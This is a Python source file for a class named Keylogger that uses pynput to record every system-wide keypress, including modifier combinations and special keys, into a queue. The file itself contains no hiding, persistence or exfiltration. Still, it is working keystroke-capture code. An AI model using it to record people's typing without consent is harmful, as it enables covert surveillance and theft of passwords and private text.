from pynput import keyboard
from queue import Queue


MODIFIER_MAP = {
    "ctrl": "Ctrl", "ctrl_r": "Ctrl",
    "alt": "Alt", "alt_r": "Alt", "alt_gr": "Alt",
    "cmd": "Win", "cmd_r": "Win", "super": "Win",
    "shift": "Shift", "shift_r": "Shift",
}

SPECIAL_KEY_MAP = {
    "enter": "\n",
    "space": " ",
    "tab": "\t",
    "backspace": "<Backspace>",
    "esc": "<Esc>",
    "caps_lock": "<CapsLock>",
    "delete": "<Delete>",
    "up": "<Up>",
    "down": "<Down>",
    "left": "<Left>",
    "right": "<Right>",
    "home": "<Home>",
    "end": "<End>",
    "page_up": "<PageUp>",
    "page_down": "<PageDown>",
    "insert": "<Insert>",
    "menu": "<Menu>",
    "pause": "<Pause>",
    "print_screen": "<PrintScreen>",
    "scroll_lock": "<ScrollLock>",
    "num_lock": "<NumLock>",
    "f1": "<F1>",
    "f2": "<F2>",
    "f3": "<F3>",
    "f4": "<F4>",
    "f5": "<F5>",
    "f6": "<F6>",
    "f7": "<F7>",
    "f8": "<F8>",
    "f9": "<F9>",
    "f10": "<F10>",
    "f11": "<F11>",
    "f12": "<F12>",
}


class Keylogger:
    def __init__(self, queue: Queue):
        self.queue = queue
        self.listener = None
        self.pressed_mods = set()
        self.mod_used = False

    def _get_key_name(self, key):
        try:
            return key.char or ""
        except AttributeError:
            return str(key).replace("Key.", "").lower()

    def _format_key(self, key):
        try:
            if key.char:
                return key.char
            return ""
        except AttributeError:
            key_name = str(key).replace("Key.", "").lower()
            return SPECIAL_KEY_MAP.get(key_name, f"<{key_name}>")

    @staticmethod
    def _combo_display(formatted):
        if formatted == "\n":
            return "Enter"
        if formatted == "\t":
            return "Tab"
        if formatted == " ":
            return "Space"
        if isinstance(formatted, str) and len(formatted) == 1:
            c = ord(formatted)
            if 1 <= c <= 26:
                return chr(c + 64)
            if c == 127:
                return "Backspace"
            if formatted.isprintable():
                return formatted.upper()
        return str(formatted)

    def _on_press(self, key):
        name = self._get_key_name(key)

        if name in MODIFIER_MAP:
            self.pressed_mods.add(MODIFIER_MAP[name])
            return

        formatted = self._format_key(key)

        if self.pressed_mods:
            self.mod_used = True

            display = self._combo_display(formatted)

            if "Shift" in self.pressed_mods and isinstance(formatted, str) and formatted.isprintable():
                mods = [m for m in self.pressed_mods if m != "Shift"]
                if not mods:
                    self.queue.put(formatted)
                    return
            else:
                mods = sorted(self.pressed_mods)

            combo = "+".join(mods) + "+" + display
            self.queue.put(f"[{combo}]")
        else:
            self.queue.put(formatted)

    def _on_release(self, key):
        name = self._get_key_name(key)

        if name in MODIFIER_MAP:
            mod = MODIFIER_MAP[name]
            self.pressed_mods.discard(mod)

            if not self.pressed_mods:
                if not self.mod_used:
                    self.queue.put(f"<{mod}>")
                self.mod_used = False

    def start(self):
        self.listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )
        self.listener.start()

    def stop(self):
        if self.listener and self.listener.running:
            self.listener.stop()
